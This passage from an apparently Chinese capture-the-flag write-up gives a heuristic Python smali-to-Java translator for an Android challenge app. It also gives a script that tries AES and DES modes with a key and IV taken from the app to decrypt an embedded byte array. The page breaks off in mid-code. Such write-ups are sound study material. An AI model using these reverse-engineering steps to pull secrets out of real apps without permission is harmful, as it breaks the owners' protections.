class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> block_lines:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.array-data&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            in_array = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> in_array:</span><br><span class="line">            <span class="keyword">if</span> L.strip().startswith(<span class="string">&quot;.end array-data&quot;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># lines like 0x76</span></span><br><span class="line">            tokens = L.strip().split()</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> tokens:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    val = <span class="built_in">int</span>(t, <span class="number">16</span>)</span><br><span class="line">                    arr.append(<span class="built_in">str</span>(val))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;new byte[]&#123;%s&#125;&quot;</span> % (<span class="string">&quot;, &quot;</span>.join(arr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># translate a single record body to a Java-like snippet</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">translate_body</span>(<span class="params">body: <span class="type">List</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    out = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="comment"># accumulate array-data blocks</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&quot;.array-data&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> body):</span><br><span class="line">        <span class="comment"># try to detect the sput-object with TARGET and attach the array literal</span></span><br><span class="line">        <span class="comment"># naive: find sput-object line target field name</span></span><br><span class="line">        sput = <span class="built_in">next</span>((l <span class="keyword">for</span> l <span class="keyword">in</span> body <span class="keyword">if</span> <span class="string">&quot;sput-object&quot;</span> <span class="keyword">in</span> l), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> sput:</span><br><span class="line">            <span class="comment"># sput-object v0, Lcom/swdd/strangeapp/MainActivity;-&gt;TARGET:[B</span></span><br><span class="line">            m = re.search(<span class="string">r&quot;sput-object\s+\S+,\s+L([^;]+);-&gt;(\w+):(\[B)&quot;</span>, sput)</span><br><span class="line">            <span class="keyword">if</span> m:</span><br><span class="line">                class_path = m.group(<span class="number">1</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">                field = m.group(<span class="number">2</span>)</span><br><span class="line">                arr_lit = decode_array_data(body)</span><br><span class="line">                out.append(<span class="string">&quot;/* static byte[] %s.%s initialized */&quot;</span> % (class_path, field))</span><br><span class="line">                out.append(<span class="string">&quot;private static byte[] %s = %s;&quot;</span> % (field, arr_lit))</span><br><span class="line">                <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="comment"># generic instruction translations</span></span><br><span class="line">    <span class="keyword">for</span> L <span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> L.strip() <span class="keyword">or</span> L.strip().startswith(<span class="string">&quot;#&quot;</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># .registers N  -&gt; comment</span></span><br><span class="line">        <span class="keyword">if</span> L.strip().startswith(<span class="string">&quot;.registers&quot;</span>):</span><br><span class="line">            out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># const-string v0, &quot;...&quot;</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*const-string\s+(\S+),\s+\&quot;(.*)\&quot;&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = \&quot;%s\&quot;;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># const/4 v0, 0  or const/16</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*const(?:/\w+)?\s+(\S+),\s+(-?\d+|0x[0-9a-fA-F]+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = %s;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># new-instance v2, Lcom/xxx/MyClass;</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*new-instance\s+(\S+),\s+L([^;]+);&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = new %s();&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># new-array v0, vN, [B  =&gt; byte[] arr = new byte[len];</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*new-array\s+(\S+),\s+(\S+),\s+\[B&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = new byte[%s];&quot;</span> % (vname(m.group(<span class="number">1</span>)), vname(m.group(<span class="number">2</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># fill-array-data v0, :array_000a  -&gt; handled by array-data block</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;fill-array-data&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># iput-object v0, v1, Lcom/...;-&gt;f$0:Type</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*iput-object\s+(\S+),\s+(\S+),\s+L([^;]+);-&gt;([^:]+):(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s.%s = %s;&quot;</span> % (vname(m.group(<span class="number">2</span>)), m.group(<span class="number">4</span>), vname(m.group(<span class="number">1</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># sput-object v0, Lcom/...;-&gt;TARGET:[B  (static put)</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*sput-object\s+(\S+),\s+L([^;]+);-&gt;([^:]+):(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s.%s = %s;&quot;</span> % (m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), m.group(<span class="number">3</span>), vname(m.group(<span class="number">1</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># sget-object v2, Lcom/...;-&gt;TARGET:[B</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*sget-object\s+(\S+),\s+L([^;]+);-&gt;([^:]+):(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = %s.%s;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), m.group(<span class="number">3</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-direct &#123;v0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-direct\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;(\S+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            method_owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            method_name = m.group(<span class="number">3</span>)</span><br><span class="line">            params = m.group(<span class="number">4</span>)</span><br><span class="line">            out.append(<span class="string">&quot;// constructor call: %s.%s(%s)  // from regs %s&quot;</span> % (method_owner, method_name, params, <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(vname, regs))))</span><br><span class="line">            <span class="keyword">if</span> method_name == <span class="string">&quot;&lt;init&gt;&quot;</span>:</span><br><span class="line">                <span class="comment"># make a new-expression if single reg used as receiver assignment</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(regs) &gt;= <span class="number">1</span>:</span><br><span class="line">                    out.append(<span class="string">&quot;%s = new %s();&quot;</span> % (vname(regs[<span class="number">0</span>]), method_owner))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-virtual &#123;v3, v0&#125;, Lcom/swdd/...;-&gt;setContentView(I)V</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-virtual\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;([^()]+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            mname = m.group(<span class="number">3</span>)</span><br><span class="line">            sig = m.group(<span class="number">4</span>)</span><br><span class="line">            args = <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs[<span class="number">1</span>:]) <span class="keyword">if</span> <span class="built_in">len</span>(regs) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)</span><br><span class="line">            <span class="comment"># heuristic: if first register is &#x27;v3&#x27; likely it&#x27;s &quot;this&quot;</span></span><br><span class="line">            out.append(<span class="string">&quot;%s.%s(%s);&quot;</span> % (vname(regs[<span class="number">0</span>]), mname, args))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-static (call static method)</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-static\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;([^()]+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            mname = m.group(<span class="number">3</span>)</span><br><span class="line">            args = <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs)</span><br><span class="line">            out.append(<span class="string">&quot;%s.%s(%s);&quot;</span> % (owner, mname, args))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># invoke-super &#123;v3, v4&#125;, Landroidx/...;-&gt;onCreate(Landroid/os/Bundle;)V</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*invoke-super\s+\&#123;([^&#125;]+)\&#125;,\s+L([^;]+);-&gt;([^()]+)\((.*?)\)(.+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            regs = [r.strip() <span class="keyword">for</span> r <span class="keyword">in</span> m.group(<span class="number">1</span>).split(<span class="string">&quot;,&quot;</span>)]</span><br><span class="line">            owner = m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">            mname = m.group(<span class="number">3</span>)</span><br><span class="line">            out.append(<span class="string">&quot;super.%s(%s);&quot;</span> % (mname, <span class="string">&quot;, &quot;</span>.join(vname(r) <span class="keyword">for</span> r <span class="keyword">in</span> regs[<span class="number">1</span>:])))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># return-void / return-object v2</span></span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\breturn-void\b&quot;</span>, L):</span><br><span class="line">            out.append(<span class="string">&quot;return;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*return-object\s+(\S+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;return %s;&quot;</span> % vname(m.group(<span class="number">1</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*return-(?:value|v32)?\s+(\S+)&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;return %s;&quot;</span> % vname(m.group(<span class="number">1</span>)))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># check-cast / check-cast v0, Landroid/widget/EditText;</span></span><br><span class="line">        m = re.<span class="keyword">match</span>(<span class="string">r&quot;\s*check-cast\s+(\S+),\s+L([^;]+);&quot;</span>, L)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            out.append(<span class="string">&quot;%s = (%s) %s;&quot;</span> % (vname(m.group(<span class="number">1</span>)), m.group(<span class="number">2</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;.&quot;</span>), vname(m.group(<span class="number">1</span>))))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># find view: invoke-virtual &#123;this, id&#125;, L...;-&gt;findViewById(I)Landroid/view/View;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;findViewById&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line">            <span class="comment"># try to convert to: varX = findViewById(id);</span></span><br><span class="line">            m = re.search(<span class="string">r&quot;findViewById\((I)?\)&quot;</span>, L)</span><br><span class="line">            <span class="comment"># fallback simple comment</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># substring/charAt/xor/text constructs (simple heuristics)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;charAt&quot;</span> <span class="keyword">in</span> L <span class="keyword">or</span> <span class="string">&quot;substring&quot;</span> <span class="keyword">in</span> L <span class="keyword">or</span> <span class="string">&quot;StringBuilder&quot;</span> <span class="keyword">in</span> L:</span><br><span class="line">            out.append(<span class="string">&quot;// string manipulation: &quot;</span> + L.strip())</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># fallback: keep the original line as a comment for inspection</span></span><br><span class="line">        out.append(<span class="string">&quot;// &quot;</span> + L.strip())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Main ------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python3 smali2java.py input.smali.txt&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Output is printed to stdout. Redirect to a file if you want.&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="comment"># read stdin as fallback</span></span><br><span class="line">        data = sys.stdin.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">    lines = data.splitlines()</span><br><span class="line">    records = read_records(lines)</span><br><span class="line"></span><br><span class="line">    header = []</span><br><span class="line">    body_lines = []</span><br><span class="line">    header.append(<span class="string">&quot;// Generated by smali2java.py (heuristic).&quot;</span>)</span><br><span class="line">    header.append(<span class="string">&quot;// Input records: %d&quot;</span> % <span class="built_in">len</span>(records))</span><br><span class="line">    header.append(<span class="string">&quot;public class Decompiled &#123;&quot;</span>)</span><br><span class="line">    header.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    footer = [<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># collect static fields from records (like TARGET array)</span></span><br><span class="line">    static_fields = []</span><br><span class="line">    methods = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> rec <span class="keyword">in</span> records:</span><br><span class="line">        tid = rec[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        <span class="comment"># quick detect: array-data + sput-object -&gt; static array field</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&quot;.array-data&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> rec[<span class="string">&quot;body&quot;</span>]) <span class="keyword">and</span> <span class="built_in">any</span>(<span class="string">&quot;sput-object&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> rec[<span class="string">&quot;body&quot;</span>]):</span><br><span class="line">            translated = translate_body(rec[<span class="string">&quot;body&quot;</span>])</span><br><span class="line">            static_fields.extend(translated)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># detect onCreate-like (invoke-super onCreate, setContentView, findViewById etc)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="string">&quot;onCreate&quot;</span> <span class="keyword">in</span> l <span class="keyword">or</span> <span class="string">&quot;setContentView&quot;</span> <span class="keyword">in</span> l <span class="keyword">for</span> l <span class="keyword">in</span> rec[<span class="string">&quot;body&quot;</span>]):</span><br><span class="line">            body = translate_body(rec[<span class="string">&quot;body&quot;</span>])</span><br><span class="line">            methods.append((<span class="string">&quot;void onCreate(Bundle savedInstanceState /* inferred from smali */)&quot;</span>, body))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># else generic method block</span></span><br><span class="line">        body = translate_body(rec[<span class="string">&quot;body&quot;</span>])</span><br><span class="line">        methods.append((<span class="string">f&quot;/* record_<span class="subst">&#123;tid&#125;</span>_method */ void method_<span class="subst">&#123;tid&#125;</span>()&quot;</span>, body))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print Java-like file</span></span><br><span class="line">    out = []</span><br><span class="line">    out.extend(header)</span><br><span class="line">    <span class="keyword">if</span> static_fields:</span><br><span class="line">        out.append(<span class="string">&quot;    // static fields inferred&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> sf <span class="keyword">in</span> static_fields:</span><br><span class="line">            out.append(<span class="string">&quot;    &quot;</span> + sf)</span><br><span class="line">        out.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> sig, body <span class="keyword">in</span> methods:</span><br><span class="line">        out.append(<span class="string">&quot;    public &quot;</span> + sig + <span class="string">&quot; &#123;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> body:</span><br><span class="line">            out.append(<span class="string">&quot;        // (empty / unrecognized body)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> ln <span class="keyword">in</span> body:</span><br><span class="line">                <span class="comment"># indent translated lines</span></span><br><span class="line">                <span class="keyword">for</span> sub <span class="keyword">in</span> ln.splitlines():</span><br><span class="line">                    out.append(<span class="string">&quot;        &quot;</span> + sub)</span><br><span class="line">        out.append(<span class="string">&quot;    &#125;&quot;</span>)</span><br><span class="line">        out.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    out.extend(footer)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(out))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到java源码逆向解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decrypt_try.py</span></span><br><span class="line"><span class="comment"># 运行前: pip install pycryptodome</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES, DES3, AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">TARGET = <span class="built_in">bytes</span>([<span class="number">118</span>, <span class="number">17</span>, <span class="number">7</span>, <span class="number">124</span>, <span class="number">157</span>, <span class="number">51</span>, <span class="number">23</span>, <span class="number">133</span>, <span class="number">178</span>, <span class="number">23</span>, <span class="number">203</span>, <span class="number">1</span>, <span class="number">42</span>, <span class="number">109</span>, <span class="number">179</span>, <span class="number">5</span>, <span class="number">169</span>, <span class="number">10</span>, <span class="number">179</span>, <span class="number">106</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">123</span>, <span class="number">138</span>, <span class="number">209</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">115</span>, <span class="number">151</span>, <span class="number">245</span>, <span class="number">218</span>, <span class="number">238</span>, <span class="number">184</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">135</span>, <span class="number">212</span>, <span class="number">119</span>, <span class="number">215</span>, <span class="number">87</span>, <span class="number">118</span>, <span class="number">95</span>, <span class="number">180</span>, <span class="number">172</span>, <span class="number">69</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从反编译看到的 key/iv 字符串</span></span><br><span class="line">key_str = <span class="string">b&quot;1234567891123456&quot;</span>  <span class="comment"># 16 bytes</span></span><br><span class="line">iv_str = <span class="string">b&quot;1234567891123456&quot;</span>   <span class="comment"># 16 bytes</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;TARGET length:&quot;</span>, <span class="built_in">len</span>(TARGET))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;TARGET hex:&quot;</span>, binascii.hexlify(TARGET).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_aes_128_cbc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = AES.new(key_str, AES.MODE_CBC, iv=iv_str[:<span class="number">16</span>])</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), AES.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nAES-128-CBC -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nAES-128-CBC -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_des_cbc_with_truncated_key</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k = key_str[:<span class="number">8</span>]</span><br><span class="line">        iv = iv_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES.new(k, DES.MODE_CBC, iv=iv)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-CBC (key=first8, iv=first8) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key (hex):&quot;</span>, binascii.hexlify(k).decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-CBC -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_des_ecb_truncated_key</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k = key_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES.new(k, DES.MODE_ECB)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-ECB (key=first8) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nDES-ECB -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_3des_cbc_with_16byte_key_padded</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k16 = key_str</span><br><span class="line">        k24 = k16 + k16[:<span class="number">8</span>]  <span class="comment"># 常用的 from-16-to-24 扩展</span></span><br><span class="line">        iv = iv_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES3.new(k24, 